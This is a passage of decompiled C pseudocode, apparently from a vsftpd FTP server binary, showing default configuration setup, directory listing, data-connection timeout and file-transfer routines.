    *(_DWORD *)(a1 + 376) = -1;
  }
  v4 = *(_DWORD *)(a1 + 380);
  if ( v4 != -1 )
  {
    result = sub_13880(v4);
    *(_DWORD *)(a1 + 380) = -1;
  }
  return result;
}

//----- (0000000000008FF0) ----------------------------------------------------
int __fastcall sub_8FF0(__int64 a1)
{
  int v2; // edi
  int result; // eax

  v2 = *(_DWORD *)(a1 + 380);
  if ( v2 == -1 )
    sub_4B30("child_fd not active");
  result = sub_13880(v2);
  *(_DWORD *)(a1 + 380) = -1;
  return result;
}

//----- (0000000000009030) ----------------------------------------------------
int __fastcall sub_9030(__int64 a1)
{
  int v2; // edi
  int result; // eax

  v2 = *(_DWORD *)(a1 + 376);
  if ( v2 == -1 )
    sub_4B30("parent_fd not active");
  result = sub_13880(v2);
  *(_DWORD *)(a1 + 376) = -1;
  return result;
}

//----- (0000000000009070) ----------------------------------------------------
__int64 __fastcall sub_9070(unsigned int a1, char a2)
{
  __int64 result; // rax
  char v3[12]; // [rsp+Ch] [rbp-Ch] BYREF

  v3[0] = a2;
  result = sub_129A0(a1, (__int64)v3, 1);
  if ( (_DWORD)result != 1 )
    sub_4B80();
  return result;
}
// 9070: using guessed type char var_C[12];

//----- (00000000000090A0) ----------------------------------------------------
__int64 __fastcall sub_90A0(unsigned int a1)
{
  unsigned __int8 v2; // [rsp+7h] [rbp-11h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( (unsigned int)sub_12920(a1, (__int64)&v2, 1) != 1 )
    sub_4B80();
  return v2;
}

//----- (0000000000009100) ----------------------------------------------------
__int64 __fastcall sub_9100(unsigned int a1)
{
  unsigned __int8 v2; // [rsp+7h] [rbp-11h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( (unsigned int)sub_12920(a1, (__int64)&v2, 1) != 1 )
    sub_4B80();
  return v2;
}

//----- (0000000000009160) ----------------------------------------------------
__int64 __fastcall sub_9160(unsigned int a1, char a2)
{
  __int64 result; // rax
  char v3[12]; // [rsp+Ch] [rbp-Ch] BYREF

  v3[0] = a2;
  result = sub_129A0(a1, (__int64)v3, 1);
  if ( (_DWORD)result != 1 )
    sub_4B80();
  return result;
}
// 9160: using guessed type char var_C[12];

//----- (00000000000091B0) ----------------------------------------------------
__int64 __fastcall sub_91B0(unsigned int a1, int a2)
{
  __int64 result; // rax
  int v3[3]; // [rsp+Ch] [rbp-Ch] BYREF

  v3[0] = a2;
  result = sub_129A0(a1, (__int64)v3, 4);
  if ( (_DWORD)result != 4 )
    sub_4B80();
  return result;
}
// 91B0: using guessed type int var_C[3];

//----- (00000000000091E0) ----------------------------------------------------
__int64 __fastcall sub_91E0(unsigned int a1, _QWORD *a2)
{
  int v2; // ebx
  __int64 result; // rax

  v2 = sub_C500((__int64)a2);
  result = sub_91B0(a1, v2);
  if ( v2 )
    return sub_D460(a2, a1);
  return result;
}

//----- (0000000000009220) ----------------------------------------------------
__int64 __fastcall sub_9220(unsigned int fd, __int64 a2, int a3)
{
  __int64 result; // rax

  result = sub_91B0(fd, a3);
  if ( a3 )
  {
    result = sub_129A0(fd, a2, a3);
    if ( a3 != (_DWORD)result )
      sub_4B80();
  }
  return result;
}

//----- (0000000000009260) ----------------------------------------------------
__int64 __fastcall sub_9260(unsigned int a1)
{
  unsigned int v2; // [rsp+4h] [rbp-14h] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( (unsigned int)sub_12920(a1, (__int64)&v2, 4) != 4 )
    sub_4B80();
  return v2;
}

//----- (00000000000092C0) ----------------------------------------------------
__int64 __fastcall sub_92C0(unsigned int fd, __int64 a2, unsigned int a3)
{
  __int64 result; // rax
  int v5; // ebx

  result = sub_9260(fd);
  v5 = result;
  if ( (unsigned int)result > a3 )
    sub_4B30("recv_len bigger than buffer");
  if ( (_DWORD)result )
  {
    result = sub_12920(fd, a2, result);
    if ( v5 != (_DWORD)result )
      sub_4B80();
  }
  return result;
}

//----- (0000000000009330) ----------------------------------------------------
__int64 __fastcall sub_9330(unsigned int a1, __int64 *a2)
{
  unsigned int v2; // ebx
  __int64 result; // rax

  v2 = sub_9260(a1);
  if ( v2 > 0x20000 )
    sub_4B80();
  result = (__int64)sub_C570((__int64)a2);
  if ( v2 )
  {
    result = sub_D4C0(a2, a1, v2);
    if ( v2 != (_DWORD)result )
      sub_4B80();
  }
  return result;
}

//----- (00000000000093A0) ----------------------------------------------------
char *__fastcall sub_93A0(char *s, void **a2)
{
  char *result; // rax

  if ( *a2 )
    sub_12BB0(*a2);
  result = j__strdup(s);
  *a2 = result;
  return result;
}

//----- (00000000000093D0) ----------------------------------------------------
void sub_93D0()
{
  dword_221B80 = 1;
  dword_221B50 = 0;
  dword_221BC4 = 1;
  dword_221A78 = 1;
  dword_221C30 = 0;
  dword_221BF4 = 0;
  dword_221A94 = 0;
  dword_221A8C = 0;
  dword_221AD8 = 0;
  dword_221C18 = 0;
  dword_221A60 = 0;
  dword_221B74 = 0;
  dword_221AA8 = 0;
  dword_2219D4 = 1;
  dword_221B38 = 0;
  dword_221B70 = 0;
  dword_221ABC = 0;
  dword_221C40 = 0;
  dword_221C44 = 0;
  dword_221A90 = 0;
  dword_221A70 = 0;
  dword_221B48 = 0;
  dword_221C60 = 0;
  dword_221B4C = 0;
  dword_2219F8 = 0;
  dword_221C20 = 0;
  dword_221BEC = 0;
  dword_221BD0 = 0;
  dword_221A74 = 1;
  dword_221A34 = 0;
  dword_221C4C = 1;
  dword_221AD4 = 0;
  dword_221A48 = 0;
  dword_221BB0 = 0;
  dword_221AB4 = 0;
  dword_221C84 = 0;
  dword_221B3C = 0;
  dword_221AE0 = 1;
  dword_221C80 = 0;
  dword_221A80 = 0;
  dword_221A38 = 0;
  dword_221BC8 = 0;
  dword_221BF0 = 0;
  dword_2219D0 = 0;
  dword_221A7C = 0;
  dword_2219D8 = 1;
  dword_221AE4 = 1;
  dword_221AE8 = 1;
  dword_221A1C = 0;
  dword_221BE8 = 0;
  dword_221C04 = 0;
  dword_221AB0 = 0;
  dword_221C70 = 0;
  dword_221C3C = 1;
  dword_221BD8 = 1;
  dword_221BDC = 0;
  dword_221A84 = 0;
  dword_221C08 = 1;
  dword_221BD4 = 0;
  dword_221BB4 = 0;
  dword_221AAC = 0;
  dword_2219FC = 1;
  dword_221B6C = 1;
  dword_221A5C = 0;
  dword_221B28 = 0;
  dword_221A20 = 0;
  dword_221C1C = 0;
  dword_221A98 = 0;
  dword_221C48 = 0;
  dword_221BE0 = 1;
  dword_221A4C = 0;
  dword_2219EC = 0;
  dword_221C38 = 0;
  dword_221BFC = 1;
  dword_221A30 = 1;
  dword_221A58 = 1;
  dword_221AD0 = 1;
  dword_221B68 = 0;
  dword_221C34 = 60;
  dword_221AB8 = 60;
  dword_221B88 = 63;
  dword_221BCC = 63;
  dword_221A08 = 20;
  seconds = 300;
  dword_221BE4 = 300;
  dword_2219E8 = 5001;
  dword_221B84 = 0;
  dword_221B2C = 0;
  dword_221B10 = 0;
  dword_221A88 = 21;
  dword_221C00 = 2000;
  dword_221BA4 = 438;
  dword_221A24 = 50;
  dword_221C88 = 0;
  dword_221ADC = 1;
  dword_221BF8 = 0;
  dword_221BA0 = 3;
  dword_221A18 = 384;
  sub_93A0("/usr/share/empty", (void **)&qword_221AC0);
  sub_93A0("ftp", (void **)&qword_221B58);
  sub_93A0("root", (void **)&qword_221A50);
  sub_93A0("/var/log/xferlog", (void **)&qword_221BA8);
  sub_93A0("/var/log/vsftpd.log", (void **)&qword_221B40);
  sub_93A0(".message", (void **)&qword_221C58);
  sub_93A0("nobody", (void **)&qword_221C78);
  if ( ptr )
    sub_12BB0(ptr);
  ptr = 0LL;
  sub_93A0("/etc/vsftpd.banned_emails", (void **)&qword_221B20);
  sub_93A0("/etc/vsftpd.chroot_list", (void **)&qword_221B78);
  sub_93A0("ftp", &qword_221B98);
  sub_93A0("ftp", (void **)&qword_221A00);
  sub_93A0("/etc/vsftpd.user_list", (void **)&qword_221B00);
  if ( qword_2219F0 )
    sub_12BB0(qword_2219F0);
  qword_2219F0 = 0LL;
  if ( qword_221C50 )
    sub_12BB0(qword_221C50);
  qword_221C50 = 0LL;
  if ( qword_221B60 )
    sub_12BB0(qword_221B60);
  qword_221B60 = 0LL;
  if ( cp )
    sub_12BB0(cp);
  cp = 0LL;
  if ( qword_221C68 )
    sub_12BB0(qword_221C68);
  qword_221C68 = 0LL;
  if ( qword_221AC8 )
    sub_12BB0(qword_221AC8);
  qword_221AC8 = 0LL;
  if ( qword_221A10 )
    sub_12BB0(qword_221A10);
  qword_221A10 = 0LL;
  if ( qword_221BB8 )
    sub_12BB0(qword_221BB8);
  qword_221BB8 = 0LL;
  if ( qword_221C10 )
    sub_12BB0(qword_221C10);
  qword_221C10 = 0LL;
  if ( qword_221AF8 )
    sub_12BB0(qword_221AF8);
  qword_221AF8 = 0LL;
  if ( qword_221B18 )
    sub_12BB0(qword_221B18);
  qword_221B18 = 0LL;
  if ( qword_221A68 )
    sub_12BB0(qword_221A68);
  qword_221A68 = 0LL;
  sub_93A0("/etc/vsftpd.email_passwords", (void **)&qword_221B90);
  sub_93A0("/usr/share/ssl/certs/vsftpd.pem", &qword_221B30);
  if ( qword_221A28 )
    sub_12BB0(qword_221A28);
  qword_221A28 = 0LL;
  sub_93A0("DES-CBC3-SHA", &qword_2219E0);
  if ( qword_221AF0 )
    sub_12BB0(qword_221AF0);
  qword_221AF0 = 0LL;
  if ( qword_221A40 )
    sub_12BB0(qword_221A40);
  qword_221A40 = 0LL;
  if ( qword_221C28 )
    sub_12BB0(qword_221C28);
  qword_221C28 = 0LL;
}
// 2219D0: using guessed type int dword_2219D0;
// 2219D4: using guessed type int dword_2219D4;
// 2219D8: using guessed type int dword_2219D8;
// 2219E0: using guessed type void *qword_2219E0;
// 2219E8: using guessed type int dword_2219E8;
// 2219EC: using guessed type int dword_2219EC;
// 2219F8: using guessed type int dword_2219F8;
// 2219FC: using guessed type int dword_2219FC;
// 221A08: using guessed type int dword_221A08;
// 221A18: using guessed type int dword_221A18;
// 221A1C: using guessed type int dword_221A1C;
// 221A20: using guessed type int dword_221A20;
// 221A24: using guessed type int dword_221A24;
// 221A30: using guessed type int dword_221A30;
// 221A34: using guessed type int dword_221A34;
// 221A38: using guessed type int dword_221A38;
// 221A48: using guessed type int dword_221A48;
// 221A4C: using guessed type int dword_221A4C;
// 221A58: using guessed type int dword_221A58;
// 221A5C: using guessed type int dword_221A5C;
// 221A60: using guessed type int dword_221A60;
// 221A70: using guessed type int dword_221A70;
// 221A74: using guessed type int dword_221A74;
// 221A78: using guessed type int dword_221A78;
// 221A7C: using guessed type int dword_221A7C;
// 221A80: using guessed type int dword_221A80;
// 221A84: using guessed type int dword_221A84;
// 221A88: using guessed type int dword_221A88;
// 221A8C: using guessed type int dword_221A8C;
// 221A90: using guessed type int dword_221A90;
// 221A94: using guessed type int dword_221A94;
// 221A98: using guessed type int dword_221A98;
// 221AA8: using guessed type int dword_221AA8;
// 221AAC: using guessed type int dword_221AAC;
// 221AB0: using guessed type int dword_221AB0;
// 221AB4: using guessed type int dword_221AB4;
// 221AB8: using guessed type int dword_221AB8;
// 221ABC: using guessed type int dword_221ABC;
// 221AC0: using guessed type __int64 qword_221AC0;
// 221AD0: using guessed type int dword_221AD0;
// 221AD4: using guessed type int dword_221AD4;
// 221AD8: using guessed type int dword_221AD8;
// 221ADC: using guessed type int dword_221ADC;
// 221AE0: using guessed type int dword_221AE0;
// 221AE4: using guessed type int dword_221AE4;
// 221AE8: using guessed type int dword_221AE8;
// 221B00: using guessed type __int64 qword_221B00;
// 221B10: using guessed type int dword_221B10;
// 221B20: using guessed type __int64 qword_221B20;
// 221B28: using guessed type int dword_221B28;
// 221B2C: using guessed type int dword_221B2C;
// 221B30: using guessed type void *qword_221B30;
// 221B38: using guessed type int dword_221B38;
// 221B3C: using guessed type int dword_221B3C;
// 221B40: using guessed type __int64 qword_221B40;
// 221B48: using guessed type int dword_221B48;
// 221B4C: using guessed type int dword_221B4C;
// 221B50: using guessed type int dword_221B50;
// 221B68: using guessed type int dword_221B68;
// 221B6C: using guessed type int dword_221B6C;
// 221B70: using guessed type int dword_221B70;
// 221B74: using guessed type int dword_221B74;
// 221B78: using guessed type __int64 qword_221B78;
// 221B80: using guessed type int dword_221B80;
// 221B84: using guessed type int dword_221B84;
// 221B88: using guessed type int dword_221B88;
// 221B90: using guessed type __int64 qword_221B90;
// 221B98: using guessed type void *qword_221B98;
// 221BA0: using guessed type int dword_221BA0;
// 221BA4: using guessed type int dword_221BA4;
// 221BA8: using guessed type __int64 qword_221BA8;
// 221BB0: using guessed type int dword_221BB0;
// 221BB4: using guessed type int dword_221BB4;
// 221BC4: using guessed type int dword_221BC4;
// 221BC8: using guessed type int dword_221BC8;
// 221BCC: using guessed type int dword_221BCC;
// 221BD0: using guessed type int dword_221BD0;
// 221BD4: using guessed type int dword_221BD4;
// 221BD8: using guessed type int dword_221BD8;
// 221BDC: using guessed type int dword_221BDC;
// 221BE0: using guessed type int dword_221BE0;
// 221BE8: using guessed type int dword_221BE8;
// 221BEC: using guessed type int dword_221BEC;
// 221BF0: using guessed type int dword_221BF0;
// 221BF4: using guessed type int dword_221BF4;
// 221BF8: using guessed type int dword_221BF8;
// 221BFC: using guessed type int dword_221BFC;
// 221C00: using guessed type int dword_221C00;
// 221C04: using guessed type int dword_221C04;
// 221C08: using guessed type int dword_221C08;
// 221C18: using guessed type int dword_221C18;
// 221C1C: using guessed type int dword_221C1C;
// 221C20: using guessed type int dword_221C20;
// 221C30: using guessed type int dword_221C30;
// 221C34: using guessed type int dword_221C34;
// 221C38: using guessed type int dword_221C38;
// 221C3C: using guessed type int dword_221C3C;
// 221C40: using guessed type int dword_221C40;
// 221C44: using guessed type int dword_221C44;
// 221C48: using guessed type int dword_221C48;
// 221C4C: using guessed type int dword_221C4C;
// 221C58: using guessed type __int64 qword_221C58;
// 221C60: using guessed type int dword_221C60;
// 221C70: using guessed type int dword_221C70;
// 221C78: using guessed type __int64 qword_221C78;
// 221C80: using guessed type int dword_221C80;
// 221C84: using guessed type int dword_221C84;
// 221C88: using guessed type int dword_221C88;

//----- (0000000000009AB0) ----------------------------------------------------
__int64 __fastcall sub_9AB0(__int64 a1, int a2, DIR *a3, __int64 a4, __int64 a5, __int64 a6, int a7)
{
  unsigned int v8; // ebx
  __int64 v9; // rax
  unsigned int v10; // r15d
  int v11; // ebp
  __int64 v12; // rax
  int v13; // r14d
  unsigned int v14; // ebx
  __int64 v15; // rbp
  DIR *v16; // rbp
  unsigned int v17; // ebx
  int v19; // [rsp+Ch] [rbp-DCh]
  unsigned int v20; // [rsp+10h] [rbp-D8h]
  int v24; // [rsp+48h] [rbp-A0h]
  __int64 v25[2]; // [rsp+60h] [rbp-88h] BYREF
  __int64 v26[2]; // [rsp+70h] [rbp-78h] BYREF
  char *v27[2]; // [rsp+80h] [rbp-68h] BYREF
  char *v28; // [rsp+90h] [rbp-58h] BYREF
  __int64 v29; // [rsp+98h] [rbp-50h]
  unsigned __int64 v30; // [rsp+A8h] [rbp-40h]

  v30 = __readfsqword(0x28u);
  v25[0] = 0LL;
  v25[1] = 0LL;
  v26[0] = 0LL;
  v26[1] = 0LL;
  v27[0] = 0LL;
  v27[1] = 0LL;
  v24 = (a2 == 0) + 1;
  if ( (unsigned int)sub_CA70(a5, 82) && dword_2219F8 )
  {
    sub_ACF0((__int64)v25, (__int64)v26, a3, a4, a5, a6, a7);
    sub_C3A0((__int64)v27, a4);
    sub_C670(v27, ":\r\n");
    if ( (unsigned int)sub_10F60(a1, v27, v24) )
      goto LABEL_22;
  }
  else
  {
    sub_ACF0((__int64)v25, 0LL, a3, a4, a5, a6, a7);
  }
  v20 = sub_D980((__int64)v25);
  v28 = 0LL;
  v29 = 0LL;
  sub_C4B0((__int64)&v28, 0x4000);
  if ( !v20 )
  {
LABEL_11:
    sub_C440((__int64)&v28);
    v28 = 0LL;
    v29 = 0LL;
    v13 = sub_D980((__int64)v26);
    if ( v13 )
    {
      v14 = 0;
      while ( 1 )
      {
        v15 = sub_DAE0((__int64)v26, v14);
        if ( !sub_C600(v15, ".") && !sub_C600(v15, "..") )
        {
          sub_C3A0((__int64)&v28, a4);
          sub_C6A0(&v28, 47);
          sub_C660(&v28, v15);
          v16 = sub_D770(&v28);
          if ( v16 )
          {
            sub_C370((__int64)v27, "\r\n");
            if ( (unsigned int)sub_10F60(a1, v27, v24) )
            {
              v17 = -1;
              sub_135C0(v16);
              goto LABEL_20;
            }
            v19 = sub_9AB0(a1, a2, (_DWORD)v16, (unsigned int)&v28, a5, a6, a7);
            sub_135C0(v16);
            if ( v19 )
              break;
          }
        }
        if ( v13 == ++v14 )
          goto LABEL_19;
      }
      v17 = -1;
    }
    else
    {
LABEL_19:
      v17 = 0;
    }
LABEL_20:
    sub_C440((__int64)&v28);
    sub_D910((__int64)v25);
    sub_D910((__int64)v26);
    sub_C440((__int64)v27);
    return v17;
  }
  v8 = 0;
  while ( 1 )
  {
    v9 = sub_DAE0((__int64)v25, v8);
    sub_C660(&v28, v9);
    if ( v20 - 1 != v8 )
    {
      v10 = v8 + 1;
      v11 = sub_C500((__int64)&v28);
      v12 = sub_DAE0((__int64)v25, v8 + 1);
      if ( (unsigned int)sub_C500(v12) + v11 <= 0x4000 )
        goto LABEL_10;
    }
    if ( (unsigned int)sub_10F60(a1, &v28, v24) )
      break;
    v10 = v8 + 1;
    sub_C570((__int64)&v28);
LABEL_10:
    ++v8;
    if ( v10 >= v20 )
      goto LABEL_11;
  }
  sub_C440((__int64)&v28);
LABEL_22:
  v17 = -1;
  sub_D910((__int64)v25);
  sub_D910((__int64)v26);
  sub_C440((__int64)v27);
  return v17;
}
// 2219F8: using guessed type int dword_2219F8;

//----- (0000000000009EF0) ----------------------------------------------------
unsigned int __fastcall sub_9EF0(__int64 a1)
{
  unsigned int result; // eax

  if ( dword_221BE4 )
  {
    sub_124F0(1, (__int64)sub_9F50, a1, 1u);
    return j__alarm(dword_221BE4);
  }
  else
  {
    result = seconds;
    if ( seconds )
      return sub_12830();
  }
  return result;
}

//----- (0000000000009F50) ----------------------------------------------------
__int64 __fastcall sub_9F50(__int64 a1)
{
  if ( !*(_DWORD *)(a1 + 44) )
    sub_5640(a1, 421, "Data timeout. Reconnect. Sorry.");
  *(_DWORD *)(a1 + 44) = 0;
  return sub_9EF0(a1);
}
// 9EF0: using guessed type __int64 __fastcall sub_9EF0(_QWORD);

//----- (0000000000009F80) ----------------------------------------------------
unsigned int __fastcall sub_9F80(__int64 a1, int a2)
{
  if ( *(_DWORD *)(a1 + 40) != -1 )
    sub_4B30("data descriptor still present in init_data_sock_params");
  *(_DWORD *)(a1 + 40) = a2;
  *(_DWORD *)(a1 + 44) = 0;
  sub_12DE0(a2);
  sub_12FC0(a2);
  sub_13010(a2);
  sub_127A0((__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_9FE0, a1);
  return sub_9EF0(a1);
}

//----- (0000000000009FE0) ----------------------------------------------------
void __fastcall sub_9FE0(signed int a1, int a2, _DWORD *a3)
{
  int v4; // eax
  int v5; // eax
  __time_t v6; // r12
  __suseconds_t v7; // rax
  double v8; // xmm2_8
  int v9; // ecx
  int v10; // edx

  if ( a3[10] == a2 )
  {
    v4 = sub_13F40(a1);
    if ( a1 )
    {
      if ( !v4 )
      {
        v5 = a3[12];
        a3[11] = 1;
        if ( v5 )
        {
          v6 = sub_15470();
          v7 = sub_155B0();
          v8 = (double)((int)v6 - a3[14]) + (double)((int)v7 - a3[16]) / 1000000.0;
          if ( v8 <= 0.0 )
            v8 = 0.01;
          v9 = a3[12];
          v10 = (int)((double)a1 / v8);
          if ( v10 > (unsigned int)v9 )
          {
            sub_155D0(((double)v10 / (double)v9 - 1.0) * v8);
            *((_QWORD *)a3 + 7) = sub_15470();
            *((_QWORD *)a3 + 8) = sub_155B0();
          }
          else
          {
            *((_QWORD *)a3 + 7) = v6;
            *((_QWORD *)a3 + 8) = v7;
          }
        }
      }
    }
  }
}

//----- (000000000000A0D0) ----------------------------------------------------
__int64 __fastcall sub_A0D0(__int64 a1)
{
  unsigned int v1; // ebp
  int v2; // eax

  if ( *(_DWORD *)(a1 + 40) == -1 )
    sub_4B30("no data descriptor in vsf_ftpdataio_dispose_transfer_fd");
  sub_9EF0(a1);
  sub_127E0();
  if ( *(_DWORD *)(a1 + 412) && *(_DWORD *)(a1 + 456) )
  {
    sub_9070(*(_DWORD *)(a1 + 464), 7);
    v1 = (unsigned __int8)sub_90A0(*(_DWORD *)(a1 + 464)) == 1;
  }
  else
  {
    v1 = 1;
    if ( *(_QWORD *)(a1 + 432) )
      v1 = sub_11350(a1);
  }
  v2 = j__close(*(_DWORD *)(a1 + 40));
  if ( (unsigned int)sub_13F40(v2) )
  {
    sub_13090(*(_DWORD *)(a1 + 40));
    j__close(*(_DWORD *)(a1 + 40));
  }
  if ( dword_221BE4 )
    sub_12830();
  *(_DWORD *)(a1 + 40) = -1;
  return v1;
}
// 11350: using guessed type __int64 __fastcall sub_11350(_QWORD);

//----- (000000000000A1B0) ----------------------------------------------------
__int64 __fastcall sub_A1B0(__int64 a1)
{
  unsigned int v1; // ebx

  if ( dword_221C40 )
    v1 = sub_E970();
  else
    v1 = sub_F5D0(a1);
  if ( v1 == -1 )
  {
    sub_5560(a1, 425, "Failed to establish connection.");
  }
  else if ( v1 == -2 )
  {
    v1 = -1;
    sub_5560(a1, 425, "Security: Bad IP connecting.");
  }
  else
  {
    sub_9F80(a1, v1);
  }
  return v1;
}
// E970: using guessed type __int64 sub_E970(void);
// 221C40: using guessed type int dword_221C40;

//----- (000000000000A230) ----------------------------------------------------
__int64 __fastcall sub_A230(_WORD **a1)
{
  unsigned int v1; // ebx

  if ( dword_221C40 || dword_221BB0 )
    v1 = sub_E920(a1);
  else
    v1 = sub_F4C0((__int64)a1);
  if ( (unsigned int)sub_13F40(v1) )
  {
    v1 = -1;
    sub_5560((__int64)a1, 425, "Failed to establish connection.");
  }
  else
  {
    sub_9F80((__int64)a1, v1);
  }
  return v1;
}
// 221BB0: using guessed type int dword_221BB0;
// 221C40: using guessed type int dword_221C40;

//----- (000000000000A2B0) ----------------------------------------------------
__int64 __fastcall sub_A2B0(unsigned int *a1)
{
  unsigned int v1; // ebp

  if ( !a1[103] )
    return 1LL;
  if ( a1[114] )
  {
    sub_9070(a1[116], 6);
    sub_9190(a1[116], a1[10]);
    if ( (unsigned __int8)sub_90A0(a1[116]) != 1 )
    {
      v1 = 0;
      goto LABEL_4;
    }
    return 1LL;
  }
  v1 = sub_11340(a1, a1[10]);
  if ( v1 == 1 )
    return 1LL;
LABEL_4:
  sub_C370((__int64)&unk_220B60, "SSL connection failed");
  if ( dword_221BFC )
  {
    sub_C670((char **)&unk_220B60, "; session reuse required");
    sub_C670((char **)&unk_220B60, ": see require_ssl_reuse option in vsftpd.conf man page");
  }
  sub_56B0((__int64)a1, 522, (__int64)&unk_220B60);
  return v1;
}
// 9190: using guessed type __int64 __fastcall sub_9190(_QWORD, _QWORD);
// 11340: using guessed type __int64 __fastcall sub_11340(_QWORD, _QWORD);
// 221BFC: using guessed type int dword_221BFC;

//----- (000000000000A3B0) ----------------------------------------------------
__int64 __fastcall sub_A3B0(unsigned int *a1, unsigned int a2, unsigned int a3, int a4, int a5)
{
  int v7; // edx
  void *v8; // rsi
  __int64 v9; // rbx
  unsigned int v10; // ebp
  unsigned int v11; // ebp
  int v12; // r13d
  unsigned __int64 v13; // rax
  __int64 result; // rax
  __int64 v15; // rsi
  __int64 v16; // rbx
  unsigned int v17; // ebp
  __int64 v18; // rbp
  unsigned int v19; // r13d
  unsigned __int64 v20; // rax
  __int64 v21; // rdx
  __off64_t v22; // rbp
  __int64 v23; // rax
  unsigned int v24; // r8d
  __int64 v25; // r12
  unsigned int v26; // eax
  __int64 v27; // rbx
  __int64 v28; // rbx
  int v29; // ebp
  unsigned int nbytes; // [rsp+8h] [rbp-60h]
  size_t nbytesa; // [rsp+8h] [rbp-60h]
  void *v32; // [rsp+10h] [rbp-58h]
  unsigned int v33; // [rsp+10h] [rbp-58h]
  unsigned __int64 v34; // [rsp+18h] [rbp-50h]
  __int64 v35[9]; // [rsp+20h] [rbp-48h] BYREF

  LODWORD(v34) = a4;
  v35[1] = __readfsqword(0x28u);
  if ( a4 )
  {
    v33 = 0x10000;
    if ( (unsigned int)(dword_221C88 - 1) <= 0xFFFE )
    {
      v29 = 4096;
      if ( (unsigned int)dword_221C88 >= 0x1000 )
        v29 = dword_221C88;
      v33 = v29;
    }
    v15 = qword_220B40;
    if ( !qword_220B40 )
    {
      sub_A800((unsigned __int64 *)&qword_220B40, 0x10001u);
      v15 = qword_220B40;
    }
    v16 = 0LL;
    LODWORD(nbytesa) = 0;
    while ( 1 )
    {
      v18 = v15 + 1;
      v19 = sub_11080(a1, (void *)(v15 + 1), v33);
      if ( (unsigned int)sub_13F40(v19) )
        break;
      LODWORD(result) = v19 | nbytesa;
      if ( !(v19 | (unsigned int)nbytesa) )
        return (unsigned int)result;
      v16 += v19;
      if ( a5 )
      {
        v20 = sub_E600((_BYTE *)qword_220B40, v19, nbytesa);
        v19 = v20;
        v18 = v21;
        nbytesa = HIDWORD(v20);
      }
      v17 = sub_129A0(a3, v18, v19);
      if ( (unsigned int)sub_13F40(v17) || v19 != v17 )
        return 0xFFFFFFFFLL;
      v15 = qword_220B40;
    }
    return 4294967294LL;
  }
  if ( a5 || a1[103] )
  {
    nbytes = 0x10000;
    if ( (unsigned int)(dword_221C88 - 1) <= 0xFFFE )
    {
      v7 = 4096;
      if ( (unsigned int)dword_221C88 >= 0x1000 )
        v7 = dword_221C88;
      nbytes = v7;
    }
    if ( !qword_220B58 )
      sub_A800((unsigned __int64 *)&qword_220B58, 0x10000u);
    if ( a5 )
    {
      v32 = (void *)qword_220B50;
      if ( !qword_220B50 )
      {
        sub_A800((unsigned __int64 *)&qword_220B50, 0x20000u);
        v32 = (void *)qword_220B50;
      }
      v8 = qword_220B58;
    }
    else
    {
      v8 = qword_220B58;
      v32 = qword_220B58;
    }
    v9 = 0LL;
    while ( 1 )
    {
      v11 = sub_12840(a3, v8, nbytes);
      if ( (unsigned int)sub_13F40(v11) )
        return (unsigned int)-1;
      if ( !v11 )
        return v11;
      v12 = v11;
      if ( a5 )
      {
        v13 = sub_E6C0((char *)qword_220B58, (_WORD *)qword_220B50, v11, (unsigned int)v34);
        v12 = v13;
        v34 = HIDWORD(v13);
      }
      v10 = sub_11110((__int64)a1, (__int64)v32, v12);
      if ( !(unsigned int)sub_13F40(v10) )
        v9 += v10;
      if ( (unsigned int)sub_13F40(v10) || v12 != v10 )
        break;
      v8 = qword_220B58;
    }
    return (unsigned int)-2;
  }
  v22 = sub_12A20(a3);
  sub_13900(a3, (struct stat64 **)&qword_220B48);
  v23 = sub_13D50(qword_220B48);
  if ( v22 < 0 || v23 < 0 )
    sub_4B80();
  v24 = a1[12];
  v35[0] = v22;
  v25 = v23 - v22;
  if ( v22 > v23 )
    v25 = 0LL;
  if ( v24 )
  {
    v24 = 0x10000;
    if ( (unsigned int)(dword_221C88 - 1) <= 0xFFFE )
    {
      v24 = 4096;
      if ( (unsigned int)dword_221C88 >= 0x1000 )
        v24 = dword_221C88;
    }
  }
  v26 = sub_15E70(a2, a3, v35, v25, v24);
  v27 = v35[0];
  LODWORD(result) = sub_13F40(v26);
  v28 = v27 - v22;
  if ( (_DWORD)result )
    return 4294967294LL;
  if ( v28 != v25 )
    LODWORD(result) = -2;
  return (unsigned int)result;
}
// A606: variable 'v21' is possibly undefined
// 220B40: using guessed type __int64 qword_220B40;
// 220B48: using guessed type __int64 qword_220B48;
// 220B50: using guessed type __int64 qword_220B50;
// 221C88: using guessed type int dword_221C88;

//----- (000000000000A7B0) ----------------------------------------------------
unsigned int __fastcall sub_A7B0(unsigned __int64 *a1)
{
  unsigned __int64 v1; // rbx
  unsigned int result; // eax
  _DWORD *v3; // rbx

  v1 = *a1;
  result = sub_136E0();
  if ( v1 )
  {
    v3 = (_DWORD *)(v1 - v1 % result - result);
    sub_13730(v3, result, 1);
    return sub_137A0(v3, *v3);
  }
  return result;
}

//----- (000000000000A800) ----------------------------------------------------
int __fastcall sub_A800(unsigned __int64 *a1, unsigned int a2)
{
  unsigned int v3; // ebx
  unsigned int v4; // r12d
  _DWORD *v5; // rbp
  unsigned __int64 v6; // rax
  char *v7; // rbp
  unsigned int v8; // r12d
  _DWORD *v9; // rbp
  void *v10; // rdi

  v3 = sub_136E0();
  sub_A7B0(a1);
  if ( a2 % v3 )
  {
    v4 = v3 * (a2 / v3 + 3);
    v5 = sub_164A0(v4);
    sub_13730((char *)v5 + v4 - (unsigned __int64)v3, v3, 2);
    *v5 = v4;
    sub_13730(v5, v3, 2);
    v6 = v3 - a2 % v3 + (unsigned __int64)v3;
    v7 = (char *)v5 + v6;
  }
  else
  {
    v8 = a2 + 2 * v3;
    v9 = sub_164A0(v8);
    sub_13730((char *)v9 + v8 - (unsigned __int64)v3, v3, 2);
    *v9 = v8;
    v10 = v9;
    v7 = (char *)v9 + v3;
    LODWORD(v6) = sub_13730(v10, v3, 2);
  }
  *a1 = (unsigned __int64)v7;
  return v6;
}

//----- (000000000000A8D0) ----------------------------------------------------
_BOOL8 __fastcall sub_A8D0(__int64 a1, __int64 a2, _DWORD *a3)
{
  char v4; // r13
  _BOOL4 i; // r15d
  unsigned __int64 v6; // rax
  char v7; // dl
  unsigned __int64 v8; // r13
  int v9; // eax
  int v10; // eax
